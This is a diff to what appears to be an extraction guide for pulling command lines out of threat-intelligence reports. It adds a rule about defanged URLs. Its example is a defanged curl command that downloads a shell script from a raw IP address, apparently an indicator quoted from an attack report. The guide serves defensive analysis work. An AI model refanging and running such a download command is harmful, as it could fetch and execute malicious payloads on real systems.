@@ -147,6 +147,11 @@ observability, not interestingness.
   (including semicolons).
 - Do NOT expand abbreviations or environment variables.
 - Preserve obfuscated or encoded content exactly (including base64 blobs).
+- Strip enclosing < > from a defanged URL inside a command line -- the angle brackets are a
+  source-rendering artifact, not typed input. Preserve hxxp://, [.], and every other defanging
+  convention verbatim.
+  Example: curl -o sh2.txt <hxxp://173.254.204[.]72/sh2.txt>  ->  extract
+           curl -o sh2.txt hxxp://173.254.204[.]72/sh2.txt
 
 ### Wrapper handling (strict and limited)
 - Wrapper stripping applies ONLY to cmd.exe and %COMSPEC% with /c or /k:
